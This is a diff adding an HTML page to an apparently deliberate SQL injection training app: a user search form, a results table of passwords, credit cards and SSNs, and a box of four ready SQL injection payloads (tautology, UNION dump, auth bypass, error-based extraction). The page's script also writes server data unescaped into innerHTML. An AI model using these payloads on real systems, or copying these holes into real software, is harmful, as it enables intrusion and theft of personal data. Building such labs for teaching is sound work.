@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <title>User Search - SQL Injection Demo</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            color: #fff;
+            padding: 40px;
+        }
+        .container { max-width: 1000px; margin: 0 auto; }
+        h1 { color: #ff6b6b; margin-bottom: 30px; }
+        .search-box {
+            background: rgba(255,255,255,0.05);
+            padding: 30px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+        }
+        input[type="text"] {
+            width: 70%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(0,0,0,0.3);
+            color: #fff;
+            font-size: 1em;
+        }
+        button {
+            padding: 15px 30px;
+            background: linear-gradient(90deg, #ff4444, #ff8800);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+        button:hover { transform: scale(1.05); }
+        .results {
+            background: rgba(0,0,0,0.3);
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 20px;
+        }
+        table { width: 100%; border-collapse: collapse; }
+        th, td {
+            padding: 15px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        th { color: #00ccff; }
+        .attack-examples {
+            background: rgba(255,68,68,0.1);
+            border: 1px solid #ff4444;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 30px;
+        }
+        .attack-examples h3 { color: #ff4444; margin-bottom: 15px; }
+        .attack-examples code {
+            display: block;
+            background: #0d1117;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 5px;
+            color: #00ff88;
+        }
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: #00ccff;
+            text-decoration: none;
+        }
+        .query-display {
+            background: #0d1117;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-family: monospace;
+            color: #ff8800;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="/" class="back-link">← Back to Home</a>
+        <h1>💉 SQL Injection Demo - User Search</h1>
+
+        <div class="search-box">
+            <h3>Search Users</h3>
+            <p style="color: #888; margin: 10px 0;">Enter a username to search:</p>
+            <input type="text" id="searchInput" placeholder="Enter username...">
+            <button onclick="searchUsers()">Search</button>
+
+            <div class="query-display" id="queryDisplay" style="display: none;">
+                <strong>Executed Query:</strong> <span id="queryText"></span>
+            </div>
+        </div>
+
+        <div class="results" id="results" style="display: none;">
+            <h3>Search Results</h3>
+            <table id="resultsTable">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Username</th>
+                        <th>Email</th>
+                        <th>Password</th>
+                        <th>Role</th>
+                        <th>Credit Card</th>
+                        <th>SSN</th>
+                    </tr>
+                </thead>
+                <tbody></tbody>
+            </table>
+        </div>
+
+        <div class="attack-examples">
+            <h3>⚠️ Try These SQL Injection Attacks:</h3>
+            <p style="color: #aaa; margin-bottom: 15px;">These payloads will exploit the vulnerable SQL query:</p>
+
+            <p><strong>1. Extract all users:</strong></p>
+            <code>' OR '1'='1' --</code>
+
+            <p><strong>2. UNION-based injection:</strong></p>
+            <code>' UNION SELECT 1,username,password,email,role,credit_card,ssn FROM users --</code>
+
+            <p><strong>3. Bypass authentication:</strong></p>
+            <code>admin' --</code>
+
+            <p><strong>4. Extract table names (if error messages shown):</strong></p>
+            <code>' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --</code>
+        </div>
+    </div>
+
+    <script>
+        async function searchUsers() {
+            const input = document.getElementById('searchInput').value;
+            const resultsDiv = document.getElementById('results');
+            const queryDisplay = document.getElementById('queryDisplay');
+            const queryText = document.getElementById('queryText');
+            const tbody = document.querySelector('#resultsTable tbody');
+
+            // Show the query being executed
+            queryDisplay.style.display = 'block';
+            queryText.textContent = `SELECT * FROM users WHERE username LIKE '%${input}%'`;
+
+            try {
+                const response = await fetch(`/api/users/search?username=${encodeURIComponent(input)}`);
+                const data = await response.json();
+
+                tbody.innerHTML = '';
+                resultsDiv.style.display = 'block';
+
+                if (Array.isArray(data)) {
+                    data.forEach(user => {
+                        const row = document.createElement('tr');
+                        row.innerHTML = `
+                            <td>${user.id || ''}</td>
+                            <td>${user.username || ''}</td>
+                            <td>${user.email || ''}</td>
+                            <td style="color: #ff4444;">${user.password || ''}</td>
+                            <td>${user.role || ''}</td>
+                            <td style="color: #ff8800;">${user.creditCard || ''}</td>
+                            <td style="color: #ff8800;">${user.ssn || ''}</td>
+                        `;
+                        tbody.appendChild(row);
+                    });
+                } else if (data.error) {
+                    tbody.innerHTML = `<tr><td colspan="7" style="color: #ff4444;">Error: ${data.error}</td></tr>`;
+                }
+            } catch (error) {
+                tbody.innerHTML = `<tr><td colspan="7" style="color: #ff4444;">Error: ${error.message}</td></tr>`;
+            }
+        }
+
+        // Allow Enter key to search
+        document.getElementById('searchInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') searchUsers();
+        });
+    </script>
+</body>
+</html>
